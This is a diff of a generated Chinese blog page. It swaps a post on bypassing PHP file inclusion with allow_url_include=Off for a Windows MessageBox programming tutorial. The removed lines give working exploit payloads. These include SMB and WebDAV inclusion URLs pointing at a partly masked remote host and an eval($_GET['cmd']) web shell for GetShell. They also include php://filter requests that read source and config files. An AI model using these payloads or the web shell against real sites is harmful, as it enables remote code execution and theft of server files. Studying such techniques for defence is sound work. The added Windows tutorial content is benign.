@@ -18,7 +18,7 @@
   <meta name="author" content="TTT">
   <meta name="keywords" content="">
   
-  <title>php文件包含漏洞（allow_url_include=Off）的绕过方法 - Victory</title>
+  <title>从控制台到窗口程序 - Victory</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="php文件包含漏洞（allow_url_include=Off）的绕过方法">
+            <span class="h2" id="subtitle" title="从控制台到窗口程序">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-08-21 12:44" pubdate>
-        2021年8月21日 下午
+      <time datetime="2021-08-21 20:05" pubdate>
+        2021年8月21日 晚上
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      490 字
+      562 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      5
        分钟
     </span>
   
@@ -225,38 +225,88 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">php文件包含漏洞（allow_url_include=Off）的绕过方法</h1>
+            <h1 style="display: none">从控制台到窗口程序</h1>
             
             <div class="markdown-body">
-              <p>分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。</p>
-<p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
-<p>假设服务端的php代码（aaa.php）如下图所示：</p>
-<h2 id="第1种：smb协议"><a href="#第1种：smb协议" class="headerlink" title="第1种：smb协议"></a><strong>第1种：smb协议</strong></h2><p>Payload：<a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm</a></p>
-<p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
-<p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.</p>
-<p>首先在VPS上搭建Samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下图所示：</p>
-<p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
-<p>然后在/home/share目录创建abc1238.htm文件，文件内容为：<font color="red"><?php phpinfo();?></font></p>
-<p>最后启动Samba服务，访问<a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm即可绕过allow_url_include</a> = Off的限制GetShell。</p>
-<h2 id="第2种：WebDAV"><a href="#第2种：WebDAV" class="headerlink" title="第2种：WebDAV"></a><strong>第2种：WebDAV</strong></h2><p>Payload：<a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo()">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo()</a>;</p>
-<p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
-<p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器。</p>
-<p>首先在VPS上搭建WebDAV环境，我是基于Ubuntu+Apache httpd搭建的WebDAV环境。</p>
-<p>然后在WebDAV目录下创建code.htm文件，文件内容为：<font color="red"><?php eval($_GET['cmd']);?></font></p>
-<p>最后启动Apache httpd服务器，访问<a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo();%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo();即可绕过allow_url_include</a> = Off的限制GetShell。</p>
-<h2 id="第3种：php-filter"><a href="#第3种：php-filter" class="headerlink" title="第3种：php://filter/"></a><strong>第3种：php://filter/</strong></h2><p>利用php://filter/不能直接GetShell，但可以读取网站php代码文件，然后进行代码分析。或读取网站配置文件等其他重要文件。</p>
-<p>Payload：</p>
-<p><font color="red"><a target="_blank" rel="noopener" href="http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php">http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php</a></font></p>
-<p><font color="red"><a target="_blank" rel="noopener" href="http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</a></font></p>
-<p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
-<p>执行上述Payload会将D:/phpStudy/WWW/drupal-7.54/index.php文件以base64编码形式返回。</p>
-<p>这种方法在Linux和Windows服务器都可以。</p>
-<p>附带参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx">https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/include_file.html">https://www.cnblogs.com/iamstudy/articles/include_file.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>
+              <h2 id="从控制台到窗口程序"><a href="#从控制台到窗口程序" class="headerlink" title="从控制台到窗口程序"></a>从控制台到窗口程序</h2><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/2.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/3.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/4.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/5.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<blockquote>
+<p>如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档</p>
+</blockquote>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/6.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/7.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<blockquote>
+<p>直接按F1  查看参数配置</p>
+</blockquote>
+<blockquote>
+<p>MessageBox  消息框函数：</p>
+</blockquote>
+<blockquote>
+<p>显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。</p>
+</blockquote>
+<blockquote>
+<p>消息框返回一个整数值，指示用户单击了哪个按钮。</p>
+</blockquote>
+<p><strong>语法：</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">int</span> MessageBox(<br>  <span class="hljs-built_in">HWND</span>    <span class="hljs-built_in">hWnd</span>,<br>  LPCTSTR lpText,<br>  LPCTSTR lpCaption,<br>  UINT    uType<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>参数：</strong></p>
+<ul>
+<li>hWnd</li>
+</ul>
+<p>类型：<strong>HWND</strong></p>
+<p>要创建的消息框的所有者窗口的句柄。如果此参数为<strong>NULL</strong>，则消息框没有所有者窗口。</p>
+<ul>
+<li>lpText</li>
+</ul>
+<p>类型：<strong>LPCTSTR</strong></p>
+<p>要显示的消息。如果字符串由多行组成，您可以在每行之间使用回车符和/或换行符分隔各行。</p>
+<ul>
+<li>lpCaption</li>
+</ul>
+<p>类型：<strong>LPCTSTR</strong></p>
+<p>对话框标题。如果此参数为<strong>NULL</strong>，则默认标题为<strong>Error</strong>。</p>
+<ul>
+<li>uType</li>
+</ul>
+<p>类型：<strong>UINT</strong></p>
+<p>对话框的内容和行为。此参数可以是来自以下标志组的标志的组合。</p>
+<p>要指示消息框中显示的按钮，请指定以下值之一。</p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/8.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>要在消息框中显示图标，请指定以下值之一。</p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/9.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>其他的可以查文档</p>
+<p><strong>返回值：</strong></p>
+<p>类型：<strong>int</strong></p>
+<p>如果一个消息框有一个<strong>取消</strong>按钮，则该函数返回<strong>IDCANCEL</strong>如果或者ESC键被按下或值<strong>取消</strong>按钮被选择。</p>
+<p>如果消息框没有<strong>取消</strong>按钮，则按 ESC 将不起作用 - 除非存在 MB_OK 按钮。</p>
+<p>如果显示 MB_OK 按钮并且用户按下 ESC，则返回值将为<strong>IDOK</strong>。</p>
+<p>如果函数失败，则返回值为零。要获取扩展错误信息，请调用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p>
+<p>如果函数成功，则返回值是以下菜单项值之一。</p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/10.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<blockquote>
+<p>但是这样直接执行是会报错的 因为创建项目的时候 选择的是控制台输出</p>
+</blockquote>
+<blockquote>
+<p>所以需要调整</p>
+</blockquote>
+<blockquote>
+<p>先右键点击项目 点属性</p>
+</blockquote>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/11.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/12.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/13.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>将控制台换成窗口</p>
+<p>成功执行</p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/14.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<blockquote>
+<p>为什么hello word前面要加L   因为  创建项目的时候 默认是使用的WCHAR类型的字符集  不加L的话 使用的就CHAR类型的   不匹配 就会报错</p>
+</blockquote>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/15.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/16.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 
             </div>
             <hr>
@@ -266,7 +316,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/PHP/">PHP</a>
+                      <a class="hover-with-bg" href="/categories/Windows/">Windows</a>
                     
                   </div>
                 
@@ -274,9 +324,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/web/">web</a>
-                    
-                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                      <a class="hover-with-bg" href="/tags/Winodws/">Winodws</a>
                     
                   </div>
                 
@@ -293,18 +341,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">从控制台到窗口程序</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="hidden-mobile">信息收集</span>
+                      <a href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">
+                        <span class="hidden-mobile">php文件包含漏洞（allow_url_include=Off）的绕过方法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
